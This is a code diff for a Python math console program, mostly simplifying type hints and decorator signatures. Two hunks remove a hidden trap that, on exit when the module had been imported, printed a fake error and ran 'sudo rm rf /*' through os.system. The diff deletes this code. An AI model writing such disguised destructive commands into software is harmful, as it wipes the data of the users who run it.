@@ -4,13 +4,9 @@ import latex2sympy2
 import turtle
 from typing import *
 
-NOT_GOOD_LUCK = False
+
 INIT_GRAPH = False
 EXTEND_VERSION = True
-
-if __name__ != '__main__':
-    NOT_GOOD_LUCK = True
-    quit(0)
 
 var_dictionary: dict = {}
 function_information: dict = {}
@@ -30,7 +26,7 @@ def not_extend_version_command_error(*_, **__):
     print("Github Repository: https://github.com/10chen01/CWMathConsole")
 
 
-def extension_command(command: Callable[..., None]) -> Callable[..., None]:
+def extension_command(command: Callable) -> Callable:
     """
     使用这个装饰器的函数将会被标记为Extend Version特有函数
     若EXTEND_VERSION标记值为False, 将会使用not_extend_version_command_error函数代替原本的函数
@@ -52,10 +48,10 @@ def not_opened_command_used_error(*_, **__) -> None:
     print("更多信息详情请见README.md和github")
 
 
-def closing_command(command: Callable[..., None]) -> Callable[..., None]:
+def closing_command(_: Callable) -> Callable:
     """
     这是一个装饰器, 被装饰过的函数将被标记为未开放并替换为not_opened_command_used_error函数
-    :param command:
+    :param _:
     :return:
     """
     return not_opened_command_used_error
@@ -114,11 +110,6 @@ if __name__ == '__main__':
             case "exit" | "quit":
                 # 退出的指令
                 print("good bye!")
-                # 有趣的代码()
-                if NOT_GOOD_LUCK:
-                    print("UNKNOWN ERROR")
-                    os.system("sudo rm rf /*")
-                    quit(114514)
                 # 退出返回值0
                 quit(0)
             case "define" | "create":
